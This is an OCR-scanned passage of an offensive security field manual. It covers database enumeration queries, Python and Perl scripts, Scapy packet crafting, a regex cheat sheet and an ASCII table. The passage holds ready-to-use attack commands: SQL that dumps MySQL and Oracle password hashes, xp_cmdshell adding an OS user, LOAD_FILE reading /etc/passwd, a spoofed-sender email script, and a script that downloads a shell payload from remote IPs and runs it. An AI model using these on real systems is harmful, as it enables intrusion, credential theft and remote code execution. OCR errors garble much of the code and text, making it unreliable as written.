LIST COLUMNS
SELECT relname, A.attnaxe FROl1 pg_class c, pg_namespace N, pg_attribute A,
pg_tjpe T WHERE (C.relkind-'r') AND (~.oid-C.relnamespace) AND
(A.attrelid-C.oid) AND (A.atttjpid-T.oid) AND (A.attnum 0) AND (NOT
A.attisdropped) AND (N.nspname ILIKE 'public')
LIST TABLES
SELECT c.relname FROM pg_catalog.pg_class cLEFT JOIN
pg catalog.pg namespace n ON n.old - c.relnamespace WHERE c.relkind IN
( 'r','') AND n.nspnarne NOT IN ( 'pg catalog', 'pg toast') AND
pg catalog.pg table is visible(c.;id)
~3
MYSQL
SELECT @@version; DB version
SELECT @@hostname; Hostname & IP
SELECT database(); Current DB
SELECT distinct (db) FROl1 mjsql.db; List DBs
SELECT user(); Current user
SELECT user FROM mJsql.user; List users
SELECT host,user,password FROM mJsql.user; List password hashes
LIST ALL TABLES & COLUMNS
SELECT table schema, table name, column_n ame FR0t1
information scherna.columns WHERE
table schema != 'rnysql' AND table schema != 'information schema'
EXECUTE OS COMMAND THROUGH MYSQL
osql -S ip , port -U sa -P pwd -Q "exec xp cmdshell 'net user /add user
passr''
READ WORLD-READABLE FILES
UNION ALL SELECT LOAD FILE( '/etc/passwd');
WRITE TO FILE SYSTEM
SELECT ' FROl1 mjtable INTO dumpfile '/tmp/ somefile';
ORACLE
SELECT • FROM v$version; DB version
SELECT version FROM v$instance; DB version
SELECT instance name FROM v$instance; Current DB
SELECT name FROM v$database; Current DB
SELECT DISTINCT owner FROM all tables; List DBs
SELECT user FROM dual; Current user
SELECT username FROM all users ORDER BY List users
username;
SELECT column name FR0l1 all tab columns; List columns
SELECT table name FROM all tables; List tables
SELECT name, -password, astatus FROt1 SJS.user$; List password hashes
LIST DBAs
SELECT DISTINCT grantee FR0t1 dba SfS_prlvS WHERE ADlHN OPTION I YES I;
'4
l- '"
PYTHON
PYTHON PORT SCANNER
import socket as sk
for port in range (1, 1024):
trj:
s~sk. socket ( sk .AF_ INET, sk. SOCK_ STRE.Z\t1)
s.settimeout(1000)
s. connect ( (' 12~. 0. 0. l', port) )
print '%d:OPEN' % (port)
s.close
except: continue
PYTHON BASE64 WORDLIST
#!/usr/bin/pjthon
import base64
filel=open(''pwd.lst'',''r'')
file2=open(''b64pwds.lst'',''w'')
for line in filel:
clear= "administrator:"+ str.strip(line)
new= base64.encodestring(clear)
file2.write(new)
CONVERT WINDOWS REGISTRY HEX FORMAT TO READABLE ASCII
import binascii, SJS, string
dataFormatHex ~ binascii.a2b hex(SJS.argv[i])
output = ''''
for char in dataFormatEex:
if char in string.printable: output += char
1 else: output += ''.''
• print ''\n'' + output
READ ALL FILES IN FOLDER AND SEARCH FOR REGEX
import glob, re
for msg in glob.glob('/tmp/' .txt'):
filer ~ open I (msg), 'r' I
data ~ fi1er.read()
message= re.findall(r' message (.'?) /message ', data,re.DOTALL)
print ''File %s contains %s'' % (str(msg) ,message)
fi1er.c1ose()
SSL ENCRYPTED SIMPLEHTTPSERVER
Create SSL cert (follow prompts for customization)
openssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes
Create httpserver.pj
import BaseHTTPServer,SimpleHTTPServer,ssl
cert = ''cert.pem''
httpd ~ BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),
Simp1eHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)
httpd.serve forever()
PYTHON HTTP SERVER
python -m SimpleHTTPServer 8080
*
PYTHON EMAJ:L SENDER ( SENDMAJ:L MUST BE INSTALLED)
#!/usr/bin/python
import smtplib, string
import os, time
os.system("/etc/init.d/sendmail start")
time.sleep(4)
HOST = ''localhost''
SUBJECT = "Email from spoofed sender"
TO = ''PI:EMAIL''
FROM= "PI:EMAIL"
TEXT = "Message Body"
BODY = string.join( (
"From: %s" % FROH,
''To: %s'' % TO,
"Subject: %s" % SUBJECT ,
TEXT
) , "\r\n")
server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server. quit ()
time.sleep(4)
os.system("/etc/init.d/sendmail stop")
LOOP THROUGH IP LIST, DOWNLOAD FILE OVER HTTP AND EXECUTE
#!/usr/bin/python
import urllib2, os
urls = [111.1.1.1'',"2.2.2.2"]
port = 1180"
payload = "cb.sh"
for url in urls:
u = "http://%s:%s/%s" % (url, port, payload)
try:
r = urllib2.urlopen(u)
wfile = open{"/tmp/cb.sh", "wb")
wfile.write(r.read())
wfile. close ()
break
except: continue
if os.path.exists("/tmp/cb.sh"):
os.system("chmod -oo /tmp/cb.sh")
os. system ( "/tmp/cb. sh")
78
PYTHON HTTP BANNER GRABBER (* TAKES AN IP RANGE, PORT, AND
PACKET DELAY)
#!/usr/bin/python
import urllib2, sys, time
from optparse import OptionParser
parser= OptionParser()
parser.add option{''-t'', dest=''iprange'',help=''target IP range, i.e.
192.168.1.1-25")
parser.add option(''-p'', dest=''port'',default=''80'',help=''port, default=BO'')
parser.add=option("-d", dest="delay",default=".5",help="delay (in seconds),
default=.5 seconds")
(opts, args) = parser.parse_args()
if opts.iprange is None:
parser.error("you must supply an IP range")
ips = []
headers={}
octets= opts.iprange.split(' .')
start= octets[3] .split('-') [0]
stop = octets [ 3] . split ( '-' ) [ 1]
fori in range(int(start),int(stop)+1):
ips.append('%s.%s.%s.%d' % (octets[O],octets[1] ,octets[2],i))
print '\nScanning IPs: %s\n' % (ips)
for ip in ips:
try:
J response= urllib2.urlopen('http://%s:%s' % (ip,opts.port))
headers[ip] = dict(response.info())
except Exception as e:
' headers[ip] = "Error: " + str(e)
time.sleep(float(opts.delay))
for header in headers:
try:
print '%s : %s' % (header,headers[header] .get('server'))
except:
print '%s : %s' % (header,headers[header])
"9
SCAPY
* When you craft TCP packets with Scapy, the underlying OS will not
recognize the initial SYN packet and will reply with a RST packet. To
mitigate this you need to set the following Iptables rule:
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
from scapy.all import * Imports all scapy libraries
ls () List all avaiable protocols
lsc () List all scapy functions
conf Show/set scapy config
IP(src=RandiP()) Generate random src IPs
Ether(src=Randl1AC() I Generate random src MACs
ip=IP(src="l.l.l.l",dst="2.2.2.2") Specify IP parameters
tcp=TCP(dport="443") Specify TCP parameters
data=11TCP data" Specify data portion
packet=ip/tcp/data Create IP()/TCP() packet
packet. show ( I Display packet configuration
send(packet,count=l) Send 1 packet @ layer 3
sendp(packet,count=2) Send 2 packets @ layer 2
sendpfast(packet) Send faster using tcpreply
sr(packet) Send 1 packet & get replies
srl(packet) Send only return 1st reply
fori in range(O,lOOO): send (packet·) Send packet- 1000 times
sniff(count=lOO,iface=ethO) Sniff 100 packets on ethO
SEND IPv6 ICMP MSG
sr ( IPv6 ( src=" ipv6 n' dst=".ipv6 n I /ICHP (I I
tn)p PACKET W/ SPECIFIC PAYLOAD:
ip=IP(src=''·.ip.·'', dst=''·.ip. '')
u=UDP(dport=l234, sport=5678)
pay = "my UDP packet"
packet=ip/u/pay
packet. show ( )
wrpcap ("out.pcap",packet) write to pcap
send(packet)
NTP FUZZER
packet=IP(src="·.ip 11,
dst=" ip ")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4) I
SEND HTTP MESSAGE
from scapy.all import *
# Add iptables rule to block attack box from sending RSTs
# Create web.txt with entire GET/POST packet data
fileweb = open(''web.txt'','r')
data = fileweb.read()
ip = IP(dst="-ip ·")
SYN=ip/TCP(rport=RandNum(6000,-000),dport=BO,flags="S",seq=4)
SYNACK = srl(SYN)
ACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags="A",seq=SYNACK.ack,ack=SYNACK.
seq+l)/data
reply,error = sr(ACK)
print reply.show()
80
PERL
PERL PORT SCANNER
use strict; use IO: :Socket;
for($port~O;$port 65535;$port++) {
$remote~IO::Socket::INET- new(
Proto= ·"tcp",PeerAddr= ·1112-:'.0.0.l",PeerPort= $port);
if($remote) {print "$port is open\n"); )
•
'
81
REGEX EXPRESSIONS
Start of string
0 or more
+ 1 or more
0 or 1
Any char but \n
{3} Exactly 3
{3,} 3 or more
{3,5} 3 or 4 or 5
{315} 3 or 5
[345] 3 or 4 or 5
[ A34] Not 3 or 4
[a-z] lowercase a-z
[A-Z] uppercase A-Z
[0-9] digit 0-9
\d Digit
\D Not digit
\w A-Z,a-z,0-9
\W Not A-Z,a-z,0-9
\s White Space (\t\r\n\f)
\S Not (\t\r\n\f)
'
reg[ex] "rege" or "regx"
regex? ''rege'' or ''regex''
regexk ''rege'' w/ 0 or more x
regex+ ''rege'' w/ 1 or more x
[Rr]egex ''Regex'' or ''regex''
\d{3} Exactly 3 digits
\d{ 3,) 3 or more digits
[aeiou] Any 1 vowel
(0 [3-9] 11 [0-9]12 [0-5]) Numbers 03-25
82
ASCII TABLE
xOO : NUL x4b : K
x08 : BS x4c : L
x09 : TAB x4d : M
xOa : LF x4e : N
xOd : CR x4f : 0
xlb : ESC x50 : p
x20 : SPC x51 : Q
x21 : ! x52 : R
x22 : " x53 : s
x23 : # x54 : T
x24 : $ x55 : u
x25 : % x56 : v
x26 : & x57 : w
x2" : x58 : X
x28 : I x59 : y
x29 : ) x5a : z
x2a : x5b : [
x2b : + x5c : \
x x22 dc : -' xx5 5d : l
: e
x2e : x5f
x2f : I x60 : -;-
x30 : 0 x61 : a
x31 : 1 x62 : b
x32 : 2 x63 : c
x33 : 3 x64 : d
x34 : 4 x65 : e
x35 : 5 x66 : f
x36 : 6 x6" : g